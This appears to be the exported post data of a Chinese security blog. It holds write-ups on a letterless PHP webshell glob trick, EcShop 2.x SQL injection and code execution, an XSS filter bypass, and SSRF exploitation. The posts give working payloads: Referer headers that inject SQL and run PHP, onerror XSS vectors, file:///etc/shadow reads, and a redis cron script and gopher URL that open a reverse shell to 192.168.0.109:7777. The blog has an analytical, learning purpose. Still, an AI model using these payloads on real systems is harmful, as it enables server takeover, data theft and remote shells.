glob通配符的知识点：linux当中可以使用glob通配符匹配任意文件名，？可以匹配任意一个字符，[]里面可以通过ascii码指定匹配的字符范围 2.linux当中可以使用.去执行任意文件，即使这个文件没有x执行权限 3.php的短标签&lt;?=?&gt;相当于&lt;?php echo?&gt;的作用 知道了上面的几个点，就可以构造出来不含数字字母$_又可以执行命令的payload code=?&gt;&lt;?=`. /???/????????[@-[]`?&gt; 因为文件长度为/???/?????????的文件有很多，为了避免匹配不到临时文件，这里将文件名的最后字母变为大写，其中@-[之间的ascii码为A-Z 最终的执行结果，当生成的临时文件最后一个字母为大写时，就可以匹配到临时文件执行里面的命令 我所遇到的一些问题我在做这道题的时候遇到了一些问题：自己一开始并不能成功的匹配到php产生的临时文件，为了这个问题还和p牛师傅交流了好久==，最后得到了一个结论：有的linux操作系统和版本并不支持使用[]去匹配指定范围的ascii码，导致不能成功的匹配到php产生的临时文件，于是执行了其它的文件，自然就会失败。我测试的几个操作系统结果如下 docker centos6（成功） 虚拟机 centos6（失败） vps centos7（失败） 虚拟机ubuntu16.04（失败） vps ubuntu16.04(失败) 在这些linux当中，ubuntu里面的shopt是有一个globasciiranges选项的，这个配置项默认并没有开启所以会导致[]不能使用，使用shopt -s globasciiranges命令开启这个选项后就可以成功利用了 但是centos里面并没有globasciiranges这个配置项，所以暂时还不能成功利用（除了docker的centos6），这里应该就是和linux版本有关系了，最后为了方便理解，附上我的测试截图 centos7 vps ubuntu将shopt里面的globasciiranges开启就能解决问题 参考链接无字母数字webshell之提高篇","categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/categories/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"}]},{"title":"Ecshop2.x注入漏洞&代码执行漏洞分析","slug":"Ecshop2.x & 3.x版本最新漏洞分析与利用","date":"2018-09-07T01:22:48.679Z","updated":"2018-10-19T12:04:22.149Z","comments":true,"path":"2018/09/07/Ecshop2.x & 3.x版本最新漏洞分析与利用/","link":"","permalink":"http://yoursite.com/2018/09/07/Ecshop2.x & 3.x版本最新漏洞分析与利用/","excerpt":"Ecshop2.x注入漏洞&amp;代码执行漏洞分析序Ecshop最近爆出了两个高危漏洞，分别是SQL注入漏洞和代码执行漏洞，刚好自己在学代码审计方面的知识，于是自己针对两个漏洞的成因分析了一波，发现这是一个很有意思的二次漏洞，在这将整个学习过程做个记录","text":"Ecshop2.x注入漏洞&amp;代码执行漏洞分析序Ecshop最近爆出了两个高危漏洞，分别是SQL注入漏洞和代码执行漏洞，刚好自己在学代码审计方面的知识，于是自己针对两个漏洞的成因分析了一波，发现这是一个很有意思的二次漏洞，在这将整个学习过程做个记录 SQL注入漏洞分析在分析漏洞之前首先来看其中的一个payload 访问:http://site/user.php?act=login 然后在http请求头里面添加： Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;} 由payload看到漏洞的入口位置在user.php这个文件内，通过act=login关键字定位到相关的代码位置 123456789101112131415161718192021222324252627/* 用户登录界面 */elseif ($action == 'login')&#123; if (empty($back_act)) &#123; if (empty($back_act) &amp;&amp; isset($GLOBALS['_SERVER']['HTTP_REFERER'])) &#123; $back_act = strpos($GLOBALS['_SERVER']['HTTP_REFERER'], 'user.php') ? './index.php' : $GLOBALS['_SERVER']['HTTP_REFERER']; &#125; else &#123; $back_act = 'user.php'; &#125; &#125; $captcha = intval($_CFG['captcha']); if (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION['login_fail'] &gt; 2)) &amp;&amp; gd_version() &gt; 0) &#123; $GLOBALS['smarty']-&gt;assign('enabled_captcha', 1); $GLOBALS['smarty']-&gt;assign('rand', mt_rand()); &#125; $smarty-&gt;assign('back_act', $back_act); $smarty-&gt;display('user_passport.dwt');&#125; 传入的Referer的值被$GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;]这个服务器全局变量接收后到赋值给$back_act，之后$back_act变量作为参数传入assign方法，这个函数的功能主要用于注册模板变量，之后$back_act变量的值便赋值给了模板文件当中的$back_act变量，注册模板变量的代码如下 1234567891011121314151617181920212223242526272829/** * 注册变量 * * @access public * @param mix $tpl_var * @param mix $value * * @return void */function assign($tpl_var, $value = '')&#123; if (is_array($tpl_var)) &#123; foreach ($tpl_var AS $key =&gt; $val) &#123; if ($key != '') &#123; $this-&gt;_var[$key] = $val; &#125; &#125; &#125; else &#123; if ($tpl_var != '') &#123; $this-&gt;_var[$tpl_var] = $value; &#125; &#125;&#125; 之后回到user.php，又调用了display这个方法，传入的参数是user_passport.dwt这个模板文件（这时模板文件当中的$back_act变量已经被注册为传入的Referer值），模板文件关键内容如下 跟进到display函数代码的相关位置，代码如下 12345678910111213141516171819202122232425262728293031323334/** * 显示页面函数 * * @access public * @param string $filename * @param sting $cache_id * * @return void */function display($filename, $cache_id = '')&#123; $this-&gt;_seterror++; error_reporting(E_ALL ^ E_NOTICE); $this-&gt;_checkfile = false; $out = $this-&gt;fetch($filename, $cache_id); if (strpos($out, $this-&gt;_echash) !== false) &#123; $k = explode($this-&gt;_echash, $out); foreach ($k AS $key =&gt; $val) &#123; if (($key % 2) == 1) &#123; $k[$key] = $this-&gt;insert_mod($val); &#125; &#125; $out = implode('', $k); &#125; error_reporting($this-&gt;_errorlevel); $this-&gt;_seterror--; echo $out;&#125; display函数当中的fetch方法会对user_passport.dwt这个模板文件当中的变量进行解析，这时模板文件当中的$back_act变量和模板当中其它的变量经过fetch函数里面的make_compiled函数后被解析，经过处理之后的模板文件内容将返回给$out这个变量 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990/** * 处理模板文件 * * @access public * @param string $filename * @param sting $cache_id * * @return sring */function fetch($filename, $cache_id = '')&#123; if (!$this-&gt;_seterror) &#123; error_reporting(E_ALL ^ E_NOTICE); &#125; $this-&gt;_seterror++; if (strncmp($filename,'str:', 4) == 0) &#123; $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4))); &#125; else &#123; if ($this-&gt;_checkfile) &#123; if (!file_exists($filename)) &#123; $filename = $this-&gt;template_dir . '/' . $filename; &#125; &#125; else &#123; $filename = $this-&gt;template_dir . '/' . $filename; &#125; if ($this-&gt;direct_output) &#123; $this-&gt;_current_file = $filename; $out = $this-&gt;_eval($this-&gt;fetch_str(file_get_contents($filename))); &#125; else &#123; if ($cache_id &amp;&amp; $this-&gt;caching) &#123; $out = $this-&gt;template_out; &#125; else &#123; if (!in_array($filename, $this-&gt;template)) &#123; $this-&gt;template[] = $filename; &#125; $out = $this-&gt;make_compiled($filename); if ($cache_id) &#123; $cachename = basename($filename, strrchr($filename, '.')) . '_' . $cache_id; $data = serialize(array('template' =&gt; $this-&gt;template, 'expires' =&gt; $this-&gt;_nowtime + $this-&gt;cache_lifetime, 'maketime' =&gt; $this-&gt;_nowtime)); $out = str_replace(\"\\r\", '', $out); while (strpos($out, \"\\n\\n\") !== false) &#123; $out = str_replace(\"\\n\\n\", \"\\n\", $out); &#125; $hash_dir = $this-&gt;cache_dir . '/' . substr(md5($cachename), 0, 1); if (!is_dir($hash_dir)) &#123; mkdir($hash_dir); &#125; if (file_put_contents($hash_dir . '/' . $cachename . '.php', '&lt;?php exit;?&gt;' . $data . $out, LOCK_EX) === false) &#123; trigger_error('can\\'t write:' . $hash_dir . '/' . $cachename . '.php'); &#125; $this-&gt;template = array(); &#125; &#125; &#125; &#125; $this-&gt;_seterror--; if (!$this-&gt;_seterror) &#123; error_reporting($this-&gt;_errorlevel); &#125; return $out; // 返回html数据&#125; 之后判断返回的$out内容中是否有_echash这个值，如果存在，_echash的值将作为分割符对$out的内容进行分割，返回一个索引数组，将索引值为奇数的数组值传入insert_mod方法，ecshop2.x的_echash值如下 这也就是之前payload里面的那串hash值，这时payload当中_echash后面的那些内容ads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}就会被传入insert_mod方法 跟进insert_mode这个函数12345678function insert_mod($name) // 处理动态内容&#123; list($fun, $para) = explode('|', $name); $para = unserialize($para); $fun = 'insert_' . $fun; return $fun($para);&#125; 此时传入的内容$name为ads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}，之后使用expload函数以|为分割符将传入的内容分为两部分，第一部分为ads，与insert_拼接后做为该函数的回调函数insert_ads,第二部为a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}这个序列化字符串，经过unserialize函数处理后返回一个数组，这个数组会被当作回调函数insert_ads的参数，接下来定位到insert_ads这个函数的位置，和SQL注入相关的代码部分如下 1234567891011121314151617function insert_ads($arr)&#123; static $static_res = NULL; $time = gmtime(); if (!empty($arr['num']) &amp;&amp; $arr['num'] != 1) &#123; $sql = 'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, ' . 'p.ad_height, p.position_style, RAND() AS rnd ' . 'FROM ' . $GLOBALS['ecs']-&gt;table('ad') . ' AS a '. 'LEFT JOIN ' . $GLOBALS['ecs']-&gt;table('ad_position') . ' AS p ON a.position_id = p.position_id ' . \"WHERE enabled = 1 AND start_time &lt;= '\" . $time . \"' AND end_time &gt;= '\" . $time . \"' \". \"AND a.position_id = '\" . $arr['id'] . \"' \" . 'ORDER BY rnd LIMIT ' . $arr['num']; $res = $GLOBALS['db']-&gt;GetAll($sql); &#125;...后面的代码忽略 可以看到将数组的值直接拼接到了sql语句中，所以到这已经成功定位到了注入漏洞的位置，在这里可以注入的位置有两个，分别是$arr[&#39;id&#39;]的位置和$arr[&#39;num&#39;]的位置，由于注入点的不同，构造payload的方式也不同，通过之前的一步步分析，payload的构造格式也很清楚了，需要写成echash+ads+序列化处理后的索引数组(里面的键值为注入的payload)，下面来构造payload 首先是$arr[&#39;id&#39;]这个位置，关于这个位置无需多说，使用正常的报错注入方法就行，构造payload1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:4:\"name\";i:1;s:2:\"id\";s:49:\"' and extractvalue(1,concat(0x3a,user(),0x3a))-- \";&#125; 可以看到成功报错出了数据库的信息 接下来是$arr[&#39;num&#39;]这个位置的注入，这个位置的注入比较特殊，因为它在limit的后面，因为mysql的语法规则，在limit后面只能使用procedure analyse这个函数去进行报错注入，并且有很多的局限性，下面先来简单说一下有关这个函数的使用 1.该函数的参数为两个，并且只有两个参数时才能报错，两个参数的位置均可以报错 2.使用updatexml，extractvalue等报错函数报错查询数据时，不能在报错函数内使用select关键字查询数据 3.可以时间盲注，但是不能使用sleep函数，但是可以使用benchmark函数取替代sleep 报错注入利用时间盲注利用构造payload1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:\"num\";s:63:\"0,1 procedure analyse(extractvalue(1,concat(0x3a,user())),1)-- \";s:2:\"id\";i:1;&#125; 代码执行漏洞分析以下payload用于执行phpinfo() 访问:http://site/user.php?act=login 然后在http请求头里面添加： Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;}554fcae493e564ee0dc75bdf2ebf94ca 首先继续看insert_ads函数，这里的代码执行是一个经典的二次漏洞，相关的重要代码部分如下 1234567891011121314151617181920212223$position_style = '';foreach ($res AS $row)&#123; if ($row['position_id'] != $arr['id']) &#123; continue; &#125; $position_style = $row['position_style']; ...省略无关部分 &#125;&#125;$position_style = 'str:' . $position_style;$need_cache = $GLOBALS['smarty']-&gt;caching;$GLOBALS['smarty']-&gt;caching = false;$GLOBALS['smarty']-&gt;assign('ads', $ads);$val = $GLOBALS['smarty']-&gt;fetch($position_style);$GLOBALS['smarty']-&gt;caching = $need_cache;return $val; 之前的过程和注入漏洞过程一样，经过一系列处理后，$arr[&#39;id&#39;]的值变为&#39; /*,$arr[&#39;num&#39;]的值变为*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b706870696e666f2f2a2a2f28293b2f2f7d,10-- -,之后$arr[&#39;id&#39;]和$arr[&#39;num&#39;]拼接进sql语句后执行的sql如下 1SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop273`.`ecs_ad` AS a LEFT JOIN `ecshop273`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time &lt;= '1539915783' AND end_time &gt;= '1539915783' AND a.position_id = '' /*' ORDER BY rnd LIMIT */ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- - 这里需要满足一个条件，那就是传入的$arr[&#39;id&#39;]要与sql语句执行结果的$row[&#39;position_id&#39;]值相等，当这一条件满足，就将字符串str:与执行结果$row[&#39;position_style&#39;]连接后赋值给$position_style变量，这时$position_style的值变为： 1str:&#123;$abc'];echo phpinfo/**/();//&#125; 之后将$position_style再次传入fetch方法，这时候满足条件的代码部分如下： 123456789function fetch($filename, $cache_id = '')&#123; ...省略部分 if (strncmp($filename,'str:', 4) == 0) &#123; $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4))); &#125; ...省略部分&#125; 可以看到这里就是存在二次漏洞的点，_eval函数将传入的$position_style,也就是sql语句执行的结果当做代码执行了，不过在_eval执行之前，传入了内容首先经过substr截取处理后传入了fetch_str函数，于是定位到fetch_str函数，相关代码如下 1234567891011121314151617181920212223242526272829/** * 处理字符串函数 * * @access public * @param string $source * * @return sring */function fetch_str($source)&#123; if (!defined('ECS_ADMIN')) &#123; $source = $this-&gt;smarty_prefilter_preCompile($source); &#125; if(preg_match_all('~(&lt;\\?(?:\\w+|=)?|\\?&gt;|language\\s*=\\s*[\\\"\\']?php[\\\"\\']?)~is', $source, $sp_match)) &#123; $sp_match[1] = array_unique($sp_match[1]); for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++) &#123; $source = str_replace($sp_match[1][$curr_sp],'%%%SMARTYSP'.$curr_sp.'%%%',$source); &#125; for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++) &#123; $source= str_replace('%%%SMARTYSP'.$curr_sp.'%%%', '&lt;?php echo \\''.str_replace(\"'\", \"\\'\", $sp_match[1][$curr_sp]).'\\'; ?&gt;'.\"\\n\", $source); &#125; &#125; return preg_replace(\"/&#123;([^\\&#125;\\&#123;\\n]*)&#125;/e\", \"\\$this-&gt;select('\\\\1');\", $source);&#125; 传入的内容为： 1&#123;$abc'];echo phpinfo/**/();//&#125; 这里绕过了第一个正则对危险字符的检测，直接到了函数代码最后一行 1preg_replace(\"/&#123;([^\\&#125;\\&#123;\\n]*)&#125;/e\", \"\\$this-&gt;select('\\\\1');\", $source); 这里将传入的内容进行匹配，\\\\1为匹配到的第一个元组，之后将匹配到的第一个元组值传入select函数，\\\\1的值如下 1$abc'];echo phpinfo/**/();// 之后定位到select函数，关键代码部分如下： 1234567891011121314151617/** * 处理&#123;&#125;标签 * * @access public * @param string $tag * * @return sring */function select($tag)&#123; ...省略部分 elseif ($tag&#123;0&#125; == '$') // 变量 &#123; return '&lt;?php echo ' . $this-&gt;get_val(substr($tag, 1)) . '; ?&gt;'; &#125; ...省略部分&#125; 因为传入的内容第一个字符为$，所以满足该条件分支，之后将传入的内容经过substr截取处理后传入了get_val函数，这时传入的参数值变为了 1abc'];echo phpinfo/**/();// 定位到get_val函数 12345678910111213141516171819202122232425262728293031323334353637383940414243* 处理smarty标签中的变量标签** @access public* @param string $val** @return bool*/function get_val($val) &#123; if (strrpos($val, '[') !== false) &#123; $val = preg_replace(\"/\\[([^\\[\\]]*)\\]/eis\", \"'.'.str_replace('$','\\$','\\\\1')\", $val); &#125; if (strrpos($val, '|') !== false) &#123; $moddb = explode('|', $val); $val = array_shift($moddb); &#125; if (empty($val)) &#123; return ''; &#125; if (strpos($val, '.$') !== false) &#123; $all = explode('.$', $val); foreach ($all AS $key =&gt; $val) &#123; $all[$key] = $key == 0 ? $this-&gt;make_var($val) : '['. $this-&gt;make_var($val) . ']'; &#125; $p = implode('', $all); &#125; else &#123; $p = $this-&gt;make_var($val); &#125; ...省略部分 return $p;&#125; 由于传入的内容当中没有[、|和.$，所以不符合前三个条件，直接进入make_var函数，定位到make_var函数,相关的重要代码部分如下 123456789101112function make_var($val)&#123; if (strrpos($val, '.') === false) &#123; if (isset($this-&gt;_var[$val]) &amp;&amp; isset($this-&gt;_patchstack[$val])) &#123; $val = $this-&gt;_patchstack[$val]; &#125; $p = '$this-&gt;_var[\\'' . $val . '\\']'; &#125; ...省略部分&#125; 由于传入的内容里面没有.所以满足第一个条件分支，传入的最终payload$val值 1abc'];echo phpinfo/**/();// 在拼接的时候闭合了前面&#39;]，之后$p变量的值变为了 1$this-&gt;_var['abc'];echo phpinfo/**/();//'] 之后$p依次经过make_var和get_val两个函数后返回到了select函数内，然后select函数拼接处理后返回值变为 1&lt;?php echo $this-&gt;_var['abc'];echo phpinfo/**/();//']; ?&gt; 之后回到fetch_str函数内，此时preg_replace的第二个参数$this-&gt;select(&#39;\\\\1&#39;);结果就变为了1&lt;?php echo $this-&gt;_var['abc'];echo phpinfo/**/();//']; ?&gt; 之后preg_replace函数执行的结果就变为了 1&#123;&lt;?php echo $this-&gt;_var['abc'];echo phpinfo/**/();//']; ?&gt;&#125; 之后上述值作为fetch_str函数的返回值会进入_eval函数内产生代码执行，执行phpinfo，_eval函数如下 123456789function _eval($content)&#123; ob_start(); eval('?' . '&gt;' . trim($content)); $content = ob_get_contents(); ob_end_clean(); return $content;&#125; 最终php的eval函数执行的代码如下 1&lt;?php ...省略部分?&gt;&#123;&lt;?php echo $this-&gt;_var['abc'];echo phpinfo/**/();//']; ?&gt;&#125; 以上就是代码执行漏洞的执行过程，可以看到整个过程还是比较有意思的","categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/categories/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"}]},{"title":"记一次有意思的XSS绕过之奇葩的中文尖括号","slug":"2018-09-02","date":"2018-09-02T15:02:20.697Z","updated":"2018-09-05T15:02:27.503Z","comments":true,"path":"2018/09/02/2018-09-02/","link":"","permalink":"http://yoursite.com/2018/09/02/2018-09-02/","excerpt":"记一次有意思的XSS绕过之奇葩的中文尖括号记录一个我实战中遇到的比较有意思的XSS绕过，过滤方式比较奇葩，把&gt;变为了中文的尖括号＞，导致插入页面的xss payload不能被浏览器解析，但是经过一番测试无意间发现了一种绕过方式，构造方法比较特殊，在这分享一下~","text":"记一次有意思的XSS绕过之奇葩的中文尖括号记录一个我实战中遇到的比较有意思的XSS绕过，过滤方式比较奇葩，把&gt;变为了中文的尖括号＞，导致插入页面的xss payload不能被浏览器解析，但是经过一番测试无意间发现了一种绕过方式，构造方法比较特殊，在这分享一下~ 奇葩的过滤过滤方式如下可以看到对输入的过滤是将&gt;变为了中文的尖括号＞，这样的话浏览器在解析html标签时，由于标签无法正常闭合就会出现语法错误而导致xss payload无法被浏览器解析执行，加上页面可以利用的输出点只有这一个位置并且在DOM的文本节点，所以在构造xss payload的时候&gt;符号是必不可少的 bypass绕过其实也很简单，构造payload如下 1&lt;img onerror=alert(1) src=&gt; 输出点变成了下面的样子这一点的构造思路正是用到了中文尖括号＞在浏览器解析时不能被浏览器识别的特点，这样的话＞”&lt;/span会被浏览器当成img标签的src属性的属性值，也就是一个错误的图片资源，导致后面span标签的&gt;逃逸，于是span标签的&gt;闭合了img标签，xss payload执行 补充其它的绕过方法经过交流群里师傅们的指点，发现对于这种只过滤了&gt;的XSS是很不安全的,因为浏览器的容错性，在html标签内，很多标签并不需要&gt;的闭合就可以解析html，所以绕过方法很多，例如： payload: 1&lt;img src=1 onerror=alert(1)// 使用firebug查看经过DOM渲染后的html代码，可以看到浏览器会自动的按照正确的html格式去补全标签 payload： 1&lt;svg onload=alert(1)// 可以看到由于浏览器的容错性，标签也会被浏览器补全完整所以XSS的防御一定要完整的过滤转义&lt;&gt;这一对标签，仅仅只是过滤转义了&gt;还是很危险的","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://yoursite.com/categories/漏洞挖掘/"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://yoursite.com/tags/漏洞挖掘/"}]},{"title":"ssrf漏洞原理以及利用方法","slug":"ssrf","date":"2018-08-26T01:33:24.812Z","updated":"2018-08-26T14:46:48.873Z","comments":true,"path":"2018/08/26/ssrf/","link":"","permalink":"http://yoursite.com/2018/08/26/ssrf/","excerpt":"ssrf漏洞原理以及利用方法ssrf漏洞，全称为服务端请求伪造漏洞，由于有的web应用需要实现从其它服务器上获取资源的功能，但是没有对url进行限制，导致可以构造非本意的url对内网或者其它服务器发起恶意请求。ssrf漏洞的危害可以通过ssrf漏洞可以对内网或本地机器进行主机发现，服务版本探测或者针对内网或本地一些薄弱的应用进行攻击，同时利用ssrf漏洞还可以时服务器主动发起请求，从而做为一个攻击跳板或者绕过CDN找到其服务器的真实ip","text":"ssrf漏洞原理以及利用方法ssrf漏洞，全称为服务端请求伪造漏洞，由于有的web应用需要实现从其它服务器上获取资源的功能，但是没有对url进行限制，导致可以构造非本意的url对内网或者其它服务器发起恶意请求。ssrf漏洞的危害可以通过ssrf漏洞可以对内网或本地机器进行主机发现，服务版本探测或者针对内网或本地一些薄弱的应用进行攻击，同时利用ssrf漏洞还可以时服务器主动发起请求，从而做为一个攻击跳板或者绕过CDN找到其服务器的真实ip ssrf中一些可以利用的curl协议ssrf的利用方式取决于服务器所支持的curl协议，之前自己为了做该实验升级了curl的版本为最新版本，目前Centos6的curl版本为7.61.0,查看一下其支持的协议首先使用curl本地测试一些ssrf的攻击方法 利用file协议读取服务器的文件：1curl -v \"file:///etc/shadow\" 权限比较大的话，直接读取系统影子文件,不过这种情况也只是在本地测试中以root用户运行curl时才会存在利用dict协议去进行服务版本探测：1curl -v \"dict://127.0.0.1:22/info 进行ssh服务的版本探测 利用gopher协议扩大攻击面，攻击本地或者内网的一些脆弱的地方 举个栗子：比如redis数据库的默认配置允许可以直接在本地无需密码直接访问数据库，通过redis未授权访问漏洞可以通过在本地访问数据库，执行数据库语句，以利于redis未授权访问漏洞结合linux cron反弹shell为例 首先先写一个可以自动利用的shell脚本 1vi rediscron.sh 12345echo -e \"\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1\\n\\n\" | redis-cli -h $1 -p $2 -x set aaaredis-cli -h $1 -p $2 config set dir /var/spool/cronredis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit 1chmod +x rediscron.sh 之后执行脚本: 1./rediscron.sh 127.0.0.1 6379 此时redis数据库的配置为没有修改的默认配置，我们可以通过本地访问redis去利用未授权访问漏洞反弹shell，可以看到执行脚本后成功在/var/spool/cron下创建了一个反弹shell的任务计划文件 现在有一个问题就是如何将其转化为gopher协议的格式去利用，这里要利用到socat这个工具,去socat官网下载 123456wget http://www.dest-unreach.org/socat/download/socat-1.7.3.2.tar.gztar -zxvf socat-1.7.3.2.tar.gzcd socat-1.7.3.2./configuremakemake install 之后使用socat作为中间人代理抓取流量 1socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 这条命令的意思相当于是发往6379端口的数据会先经过本地的4444端口，相当于做了一个代理去抓包，可以理解为burpsuite抓包的原理 之后再次执行1./rediscron.sh 127.0.0.1 4444 可以看到socat抓到了redis攻击的数据流量,具体内容如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&gt; 2018/08/25 01:51:28.003621 length=87 from=0 to=86*3\\r$3\\rset\\r$3\\raaa\\r$58\\r* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1\\r&lt; 2018/08/25 01:51:28.003804 length=5 from=0 to=4+OK\\r&gt; 2018/08/25 01:51:28.007530 length=56 from=0 to=55*4\\r$6\\rconfig\\r$3\\rset\\r$3\\rdir\\r$15\\r/var/spool/cron\\r&lt; 2018/08/25 01:51:28.007715 length=5 from=0 to=4+OK\\r&gt; 2018/08/25 01:51:28.012076 length=52 from=0 to=51*4\\r$6\\rconfig\\r$3\\rset\\r$10\\rdbfilename\\r$4\\rroot\\r&lt; 2018/08/25 01:51:28.012204 length=5 from=0 to=4+OK\\r&gt; 2018/08/25 01:51:28.021196 length=14 from=0 to=13*1\\r$4\\rsave\\r&lt; 2018/08/25 01:51:28.023025 length=5 from=0 to=4+OK\\r&gt; 2018/08/25 01:51:28.026348 length=14 from=0 to=13*1\\r$4\\rquit\\r&lt; 2018/08/25 01:51:28.026530 length=5 from=0 to=4+OK\\r 现在需要的就是将抓取到的redis攻击流量转化为gopher协议支持的格式，这里有一个转化规则 如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。 将\\r字符串替换成%0d%0a 空白行替换为%0a 这里直接使用三叶草joychou师傅写的转化脚本tran2gopher.py 123456789101112131415161718192021222324252627#coding: utf-8#author: JoyChouimport sysexp = ''with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in '&gt;&lt;+': continue # 判断倒数第2、3字符串是否为\\r elif line[-3:-1] == r'\\r': # 如果该行只有\\r，将\\r替换成%0a%0d%0a if len(line) == 3: exp = exp + '%0a%0d%0a' else: line = line.replace(r'\\r', '%0d%0a') # 去掉最后的换行符 line = line.replace('\\n', '') exp = exp + line # 判断是否是空行，空行替换为%0a elif line == '\\x0a': exp = exp + '%0a' else: line = line.replace('\\n', '') exp = exp + lineprint exp 1python tran2gopher.py redis.log 其中redis.log为刚刚抓取到的redis攻击流量经过转化后内容如下 1*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0aaaa%0d%0a$58%0d%0a%0a%0a* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$15%0d%0a/var/spool/cron%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a 在本地使用curl的gopher协议测试一下1curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0aaaa%0d%0a$58%0d%0a%0a%0a* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$15%0d%0a/var/spool/cron%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a' 之后可以看到利用gpoher协议成功向任务计划目录下写了一个反弹shell的任务计划成功反弹shell ssrf漏洞实例存在ssrf漏洞的代码ssrf.php如下 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;ssrf漏洞实例&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=\"\"&gt; input:&lt;input type=\"text\" name=\"url\" value=\"\"/&gt; &lt;input type=\"submit\" name=\"submit\" value=\"get\"&gt; &lt;?php if(isset($_GET['url'])&amp;&amp;isset($_GET['submit'])) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['url']); #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_HEADER, 0); #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP |CURLPROTO_HTTPS); curl_exec($ch); curl_close($ch); &#125; ?&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 漏洞场景：web应用实现了从其他服务器获取资源的功能，由于对url过滤不严而产生ssrf漏洞1http://192.168.0.103/ssrf.php?url=http%3A%2F%2Fwww.4o4notfound.org%2Findex.php%2Farchives%2F33%2F&amp;submit=get 首先查看php-curl扩展所支持的curl协议使用dict协议对本地服务进行探测,探测ssh服务版本payload:1http://192.168.0.103/ssrf.php?url=dict%3A%2F%2F127.0.0.1%3A22%2Finfo&amp;submit=get 探测redis服务版本payload:1http://192.168.0.103/ssrf.php?url=dict%3A%2F%2F127.0.0.1%3A6379%2Finfo&amp;submit=get 使用file协议读取服务器文件payload：1http://192.168.0.103/ssrf.php?url=file%3A%2F%2F%2Fetc%2Fpasswd&amp;submit=get 